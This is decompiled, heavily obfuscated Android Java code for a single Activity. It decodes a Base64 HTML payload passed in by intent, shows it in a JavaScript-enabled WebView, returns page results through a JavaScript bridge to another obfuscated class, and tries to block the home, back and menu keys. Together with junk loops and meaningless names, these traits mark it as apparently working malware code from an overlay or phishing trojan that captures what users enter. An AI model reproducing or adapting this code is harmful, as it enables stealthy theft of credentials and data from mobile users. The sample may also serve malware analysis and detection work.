package com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2;

import android.app.Activity;
import android.content.Context;
import android.os.Build;
import android.os.Bundle;
import android.util.Base64;
import android.view.KeyEvent;
import android.webkit.JavascriptInterface;
import android.webkit.JsResult;
import android.webkit.WebChromeClient;
import android.webkit.WebView;
import android.webkit.WebViewClient;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.gfwxkxadopgvzuzlflfinhdyfegrasitrgoehizqvtadwruwiu4.C0045d;
import com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.grzvzobxwjhtohcthyxezccjtwvqwvnmaoetkodnimiouceknh3.oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38;
import org.json.JSONException;
import org.json.JSONObject;
/* loaded from: classes.dex */
public class fjxtblitevtobwylnabndcgjhgtekokeyjnufgerwgtketsnrq25 extends Activity {

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.fjxtblitevtobwylnabndcgjhgtekokeyjnufgerwgtketsnrq25$b */
    /* loaded from: classes.dex */
    private class C0039b extends WebChromeClient {
        private C0039b(fjxtblitevtobwylnabndcgjhgtekokeyjnufgerwgtketsnrq25 fjxtblitevtobwylnabndcgjhgtekokeyjnufgerwgtketsnrq25Var) {
        }

        @Override // android.webkit.WebChromeClient
        public boolean onJsAlert(WebView webView, String str, String str2, JsResult jsResult) {
            return true;
        }
    }

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.fjxtblitevtobwylnabndcgjhgtekokeyjnufgerwgtketsnrq25$c */
    /* loaded from: classes.dex */
    private class C0040c extends WebViewClient {
        private C0040c(fjxtblitevtobwylnabndcgjhgtekokeyjnufgerwgtketsnrq25 fjxtblitevtobwylnabndcgjhgtekokeyjnufgerwgtketsnrq25Var) {
        }

        @Override // android.webkit.WebViewClient
        public void onPageFinished(WebView webView, String str) {
        }

        @Override // android.webkit.WebViewClient
        public boolean shouldOverrideUrlLoading(WebView webView, String str) {
            return false;
        }
    }

    /* renamed from: com.ak47.jnbnvupkrxgaomnscpwrckzcbhagojkorrtvaoyfmxtzxzlctq2.fjxtblitevtobwylnabndcgjhgtekokeyjnufgerwgtketsnrq25$d */
    /* loaded from: classes.dex */
    public class C0041d {
        C0041d(Context context) {
        }

        @JavascriptInterface
        public void returnResult(String str) {
            if (str.isEmpty()) {
                return;
            }
            JSONObject jSONObject = new JSONObject();
            try {
                jSONObject.put("Result: ", str.replace("\"", "").replace("{", "[ ").replace("}", " ]").replace(",exit:", "").replace(",", " <-> "));
                oenqnjkyrvqdrfetaatefvopehtxzsbdhybdmnnvqvdxohuuih38.m117j(C0045d.f197l, jSONObject.toString().getBytes());
                fjxtblitevtobwylnabndcgjhgtekokeyjnufgerwgtketsnrq25.this.finish();
            } catch (JSONException unused) {
                Boolean bool = Boolean.TRUE;
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
                while (bool.booleanValue()) {
                    bool = Boolean.FALSE;
                }
            }
        }
    }

    @Override // android.app.Activity
    public void finish() {
        if (Build.VERSION.SDK_INT >= 21) {
            super.finishAndRemoveTask();
        } else {
            super.finish();
        }
    }

    @Override // android.app.Activity
    protected void onCreate(Bundle bundle) {
        super.onCreate(bundle);
        try {
            String stringExtra = getIntent().getStringExtra("key");
            try {
                WebView webView = new WebView(this);
                webView.getSettings().setJavaScriptEnabled(true);
                webView.setScrollBarStyle(0);
                webView.setWebViewClient(new C0040c());
                webView.setWebChromeClient(new C0039b());
                webView.addJavascriptInterface(new C0041d(this), "Android");
                webView.loadDataWithBaseURL(null, new String(Base64.decode(stringExtra, 0), "UTF-8"), "text/html", "UTF-8", null);
                setContentView(webView);
            } catch (Exception unused) {
            }
        } catch (Exception unused2) {
            Boolean bool = Boolean.TRUE;
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
            while (bool.booleanValue()) {
                bool = Boolean.FALSE;
            }
        }
    }

    @Override // android.app.Activity
    public void onDestroy() {
        super.onDestroy();
    }

    @Override // android.app.Activity, android.view.KeyEvent.Callback
    public boolean onKeyDown(int i, KeyEvent keyEvent) {
        return i == 3 || i == 4 || i == 82;
    }

    @Override // android.app.Activity
    protected void onStop() {
        super.onStop();
    }
}
